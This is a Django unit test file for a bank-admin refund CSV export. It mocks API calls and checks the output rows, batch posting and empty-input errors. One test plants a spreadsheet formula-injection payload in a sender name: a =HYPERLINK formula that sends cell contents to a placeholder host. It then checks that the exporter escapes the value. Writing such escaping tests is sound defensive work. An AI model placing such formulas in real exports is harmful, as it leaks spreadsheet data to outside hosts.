from copy import deepcopy
from datetime import datetime
from unittest import mock

from django.test import SimpleTestCase

from . import NO_TRANSACTIONS
from .. import refund, ACCESSPAY_LABEL
from ..exceptions import EmptyFileError

REFUND_TRANSACTIONS = [
    {
        'count': 3,
        'results': [{
            'id': '3',
            'amount': 2568,
            'sender_account_number': '22222222',
            'sender_sort_code': '111111',
            'sender_name': 'John Doe',
            'ref_code': '900001',
            'reference': 'for birthday',
            'credited': False,
            'refunded': False,
            'received_at': datetime.now().isoformat()
        }]
    },
    {
        'count': 3,
        'results': [{
            'id': '4',
            'amount': 1872,
            'sender_account_number': '33333333',
            'sender_sort_code': '999999',
            'sender_name': 'Joe Bloggs',
            'ref_code': '900002',
            'reference': 'A1234 22/03/66',
            'credited': False,
            'refunded': False,
            'received_at': datetime.now().isoformat()
        }, {
            'id': '5',
            'amount': 1000,
            'sender_account_number': '00000005',
            'sender_sort_code': '667788',
            'sender_name': 'Janet Buildingsoc',
            'sender_roll_number': 'A1234567XY',
            'ref_code': '900003',
            'reference': 'beep doop',
            'credited': False,
            'refunded': False,
            'received_at': datetime.now().isoformat()
        }]
    },
]


def expected_output():
    return (
        ('111111,22222222,John Doe,25.68,%(ref_a)s\r\n'
         '999999,33333333,Joe Bloggs,18.72,%(ref_b)s\r\n'
         '667788,00000005,Janet Buildingsoc,10.00,A1234567XY\r\n')
        % {'ref_a': get_base_ref() + '00001',
           'ref_b': get_base_ref() + '00002'}
    )


def get_base_ref():
    return datetime.now().strftime('Refund %d%m_')


@mock.patch('mtp_bank_admin.apps.bank_admin.refund.api_client')
@mock.patch('mtp_bank_admin.apps.bank_admin.utils.api_client')
class ValidTransactionsTestCase(SimpleTestCase):

    def test_generate_new_refund_file(self, mock_api_client, mock_refund_api_client):
        conn = mock_api_client.get_connection().bank_admin.transactions
        conn.get.side_effect = REFUND_TRANSACTIONS

        refund_conn = mock_refund_api_client.get_connection().bank_admin.transactions
        batch_conn = mock_api_client.get_connection().batches

        _, csvdata = refund.generate_new_refund_file(None)

        refund_conn.patch.assert_called_once_with([
            {'id': '3', 'refunded': True},
            {'id': '4', 'refunded': True},
            {'id': '5', 'refunded': True}
        ])
        batch_conn.post.assert_called_once_with(
            {'label': ACCESSPAY_LABEL, 'transactions': ['3', '4', '5']}
        )

        self.assertEqual(expected_output(), csvdata)

    def test_generate_previous_refund_file(self, mock_api_client, mock_refund_api_client):
        conn = mock_api_client.get_connection().bank_admin.transactions
        conn.get.side_effect = REFUND_TRANSACTIONS

        get_batch_conn = mock_api_client.get_connection().batches
        get_batch_conn.get().return_value = {'id': 1, 'label': ACCESSPAY_LABEL}

        refund_conn = mock_refund_api_client.get_connection().bank_admin.transactions
        batch_conn = mock_api_client.get_connection().batches

        _, csvdata = refund.generate_previous_refund_file(None)

        self.assertFalse(refund_conn.patch.called)
        self.assertFalse(batch_conn.post.called)

        self.assertEqual(expected_output(), csvdata)

    def test_escaping_formulae_in_csv_export(self, mock_api_client, mock_refund_api_client):
        naughty_transactions = deepcopy(REFUND_TRANSACTIONS)
        naughty_transactions[0]['results'][0]['sender_name'] = (
            '=HYPERLINK("http://127.0.0.1/?value="&A1&A1, '
            '"Error: please click for further information")'
        )
        naughty_transactions[1]['results'][0]['sender_name'] = ('=1+2')

        conn = mock_api_client.get_connection().bank_admin.transactions
        conn.get.side_effect = naughty_transactions

        _, csvdata = refund.generate_new_refund_file(None)

        self.assertEqual(
            ('''111111,22222222,"'=HYPERLINK(""http://127.0.0.1/?value=""&A1&A1, '''
             '''""Error: please click for further information"")",25.68,%(ref_a)s\r\n'''
             '''999999,33333333,'=1+2,18.72,%(ref_b)s\r\n'''
             '''667788,00000005,Janet Buildingsoc,10.00,A1234567XY\r\n''')
            % {'ref_a': get_base_ref() + '00001',
               'ref_b': get_base_ref() + '00002'},
            csvdata)


@mock.patch('mtp_bank_admin.apps.bank_admin.refund.api_client')
@mock.patch('mtp_bank_admin.apps.bank_admin.utils.api_client')
class NoTransactionsTestCase(SimpleTestCase):

    def test_generate_refund_file_raises_error(self, mock_api_client,
                                               mock_refund_api_client):
        conn = mock_api_client.get_connection().bank_admin.transactions
        conn.get.return_value = NO_TRANSACTIONS

        refund_conn = mock_refund_api_client.get_connection().bank_admin.transactions

        try:
            _, csvdata = refund.generate_new_refund_file(None)
            self.fail('EmptyFileError expected')
        except EmptyFileError:
            self.assertFalse(refund_conn.patch.called)
